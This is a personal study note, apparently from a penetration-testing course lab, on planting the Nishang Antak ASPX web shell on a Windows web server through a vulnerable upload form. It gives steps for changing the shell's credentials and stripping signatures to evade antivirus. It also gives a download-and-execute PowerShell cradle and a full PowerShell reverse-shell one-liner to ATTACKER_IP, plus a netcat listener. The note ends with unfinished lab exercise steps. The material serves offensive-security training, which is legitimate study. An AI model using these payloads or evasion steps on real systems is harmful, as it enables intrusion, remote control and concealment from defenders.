# 🎓 Quick Learning Tip (Very Important)

Before diving into ASPX shells, remember:

> It is good to supplement reading with watching demonstrations and performing hands-on as we have been doing thus far.

A powerful resource:

### 🔎 IPPSEC (ippsec.rocks)

IPPSEC’s site allows you to:

- Search for keywords like **aspx**
    
- Jump directly to timestamps in his videos
    
- Watch real-world demonstrations
    

Example:  
Search: `aspx`  
Result: Timestamp where ASPX upload and execution is demonstrated.

# 🧠 What is ASPX?

### Definition (Keep Important Concept)

**Active Server Page Extended (ASPX)** is a file type written for Microsoft’s ASP.NET Framework.

On an ASP.NET web server:

- User input → processed server-side
    
- Converted to HTML
    
- Sent back to browser
    

⚠️ Because processing happens server-side, we can:

- Inject ASPX web shells
    
- Execute Windows commands
    
- Control the underlying Windows OS

### Definition (Keep Important)

**Antak is a web shell built in ASP.Net included within the Nishang project.**

Nishang = Offensive PowerShell toolset.

Antak:

- Uses PowerShell backend
    
- Looks like PowerShell console
    
- Executes each command as a new process
    
- Can encode commands
    
- Can execute scripts in memory
    
- Can upload/download files
    

---

# 📁 Antak Location (Important)

```bash
ls /usr/share/nishang/Antak-WebShell
```

Output:

```bash
antak.aspx
Readme.md
```

---

# ⚙️ Working with Antak

---

## Step 1️⃣ Copy Antak Shell

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

---

## Step 2️⃣ Modify Credentials (VERY IMPORTANT)

Open file:

```bash
nano Upload.aspx
```

Modify line 14:

Original:

```csharp
if (username == "Disclaimer" && password == "ForLegitUseOnly")
```

Change to:

```csharp
if (username == "htb-student" && password == "StrongPassword123")
```

### Why this matters:

|Reason|Explanation|
|---|---|
|Security|Prevent random access|
|OPSEC|Protect your shell|
|Control|Limit to attacker only|

---

## ⚠️ OPSEC Tip

Remove:

- ASCII art
    
- Comments
    
- Obvious signatures
    

Why?

|Risk|Explanation|
|---|---|
|AV detection|Known patterns|
|Defender alerts|Signature-based detection|

---

# 📤 Upload Antak

Upload via vulnerable upload form.

Example:

```text
Upload.aspx
```

Stored in:

```text
\\files\Upload.aspx
```

Navigate to:

```text
http://status.inlanefreight.local/files/Upload.aspx
```

---

# 🔐 Login Prompt

Antak presents login page.

Enter credentials set earlier.

If correct → access granted.

---

# 🖥️ Antak Interface Features

Antak behaves like PowerShell.

You can:

|Feature|Function|
|---|---|
|Submit|Execute PowerShell commands|
|Browse|File browsing|
|Upload|Upload files|
|Download|Download files|
|Encode & Execute|Encode commands|
|Execute SQL Query|Database interaction|
|Parse web.config|Extract configuration|

---

# 🧪 Executing Commands

Basic enumeration:

```powershell
whoami
```

```powershell
hostname
```

```powershell
systeminfo
```

```powershell
dir C:\Users
```

---

# 📡 Deliver Reverse Shell from Antak

Start listener:

```bash
nc -lvnp 4444
```

Execute in Antak:

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
```

Or direct one-liner:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Excersises

![[Pasted image 20260228235643.png]]

Steps for the answers

Step1. The answer to the first question is in the segment itself.

Step2. Same As the previous module.Opening machine, terminal and VPN.

Step3. We have ran the Nmap scan to know the open ports of the machine and we have seen that Http server port is open and port number is also suspicious and we will exploit this. On the other hand we also have know which OS is running on Target System.
![[Pasted image 20260301000541.png]]

Step4. Now we will set hostname in hosts file.
![[Pasted image 20260220090305.png]]

Step5. now we will surf the website for which the hostname is set for.
![[Pasted image 20260220090536.png]]                                    ![[Pasted image 20260220090717.png]]


Step6. Now we will upload the antak aspx shell after adding the vpn IP.
